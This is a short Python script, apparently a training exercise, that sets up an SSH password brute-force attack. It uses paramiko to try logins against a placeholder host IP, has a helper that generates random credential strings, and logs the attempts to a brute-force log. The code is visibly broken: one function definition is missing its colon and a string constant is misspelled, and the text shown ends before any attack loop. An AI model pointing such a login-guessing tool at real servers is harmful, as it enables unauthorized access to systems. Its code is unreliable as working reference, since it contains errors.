#!/usr/bin/env python3 

# Script Name:                          attack.py
# Author name:                          Tianna Farrow
# Date of latest revision:              02/06/2024
# Purpose:                              stimulating an attack on host ip
# Execution:                            python3 attack.py
# Additional Resources:                 https://docs.python.org/3/library/logging.html; https://docs.python.org/3/library/random.html; https://docs.python.org/3/howto/logging.html; https://docs.python.org/3/library/string.html; https://stackoverflow.com/questions/52057356/the-literal-format-of-format-asctimes-levelnames-messages; 
# Note

import paramiko
import random
import string
import logging

# logging 
logging.basicConfig(filename='bruteforce.log', level =logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_random_string(length)
    return ''.join(random.choices(string.assii_letters + string.digits, k=length))

def attempt_login(username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect('will replace with host IP', username=username, password=password, timeout=5)
        client.close()
        return True
    except Exception as e:
        return False